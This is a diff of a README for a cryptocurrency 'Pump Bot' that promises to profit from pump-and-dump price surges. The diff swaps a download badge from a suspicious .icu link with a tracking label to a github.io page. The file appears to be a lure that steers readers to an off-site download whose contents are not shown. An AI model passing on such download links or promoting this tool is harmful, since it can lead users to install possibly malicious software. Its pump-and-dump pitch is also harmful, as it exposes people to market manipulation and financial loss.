@@ -2,8 +2,7 @@
 
 The **Pump Bot** is an automated cryptocurrency trading tool designed to detect **pump signals** in the market and execute trades to capitalize on **price surges**. It analyzes real-time market data, identifying sudden increases in price or volume that indicate potential **pump-and-dump** opportunities. Once a pump signal is detected, the bot automatically executes buy or sell orders, helping users profit from the surge before the market corrects. Ideal for traders looking to **automate** their strategy and take advantage of high-volatility, high-profit scenarios, the **Pump Bot** offers fast execution and **customizable settings** to match individual risk preferences and trading goals.
 
-[![Download pump bot](https://img.shields.io/badge/Download-Pump%20bot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download pump bot](https://img.shields.io/badge/Download-Pump%20bot-blueviolet)](https://pump-bot-download.github.io/.github/)
 
 ⚡ **Key Features:**
 
